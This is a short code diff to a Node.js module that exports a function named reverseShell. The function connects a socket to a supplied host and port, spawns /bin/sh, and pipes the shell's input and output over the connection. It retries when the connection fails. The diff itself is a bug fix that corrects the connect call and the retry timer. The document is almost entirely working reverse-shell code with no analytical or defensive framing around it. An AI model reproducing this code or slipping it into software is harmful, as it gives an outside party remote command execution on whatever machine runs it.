@@ -5,14 +5,14 @@ var spawn = require('child_process').spawn;
 var reverseShell = module.exports.reverseShell = function (host, port) {
     var timeout="5000";
     var client = new net.Socket();
-    client.connect(port, host, function() {
+    client.connect({host: host, port: port}, function() {
         var sh = spawn('/bin/sh',[]);
         client.write("Connected\r\n");
         client.pipe(sh.stdin);
         sh.stdout.pipe(client);
     });
     client.on('error', function(e) {
-        setTimeout(reverseShell(host,port), timeout);
+        setTimeout(function () { reverseShell(host,port) }, timeout);
     });
 }
 
